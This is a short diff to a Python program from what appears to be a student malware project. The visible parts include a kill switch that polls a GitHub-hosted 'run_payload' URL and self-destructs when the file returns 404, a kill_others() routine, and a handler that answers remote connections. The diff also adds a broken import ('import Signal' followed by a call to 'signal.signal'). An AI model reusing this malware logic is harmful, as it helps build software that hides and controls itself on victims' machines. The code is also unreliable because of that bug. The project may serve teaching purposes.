@@ -18,9 +18,8 @@ import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
-# BASE_FLAG_URL = "https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/main/run_payload"
+BASE_FLAG_URL = "https://api.github.com/repos/ucla-e1-malware/final-project-theoreos/contents/run_payload"
 
-BASE_FLAG_URL = "https://cdn.jsdelivr.net/gh/ucla-e1-malware/final-project-theoreos@main/run_payload"
 
 def kill_switch_loop():
     while True:
@@ -39,7 +38,7 @@ def check_kill_switch():
         
         # We use a HEAD request to save bandwidth
         response = requests.head(unique_url)
-        
+        print (response.status_code)
         # If GitHub returns 404, the file is officially gone
         if response.status_code == 404:
             print("Flag not found (404)! Initiating self-destruct...")
@@ -568,6 +567,9 @@ def handle_conn(conn, addr):
             send_framed(conn, b"TEXT\n" + f"error: {e}".encode())
 
 def main():
+    import Signal
+    signal.signal(signal.SIGINT, lambda s, f: os._exit(0))
+
     kill_others()
     ensure_requests()
     import threading
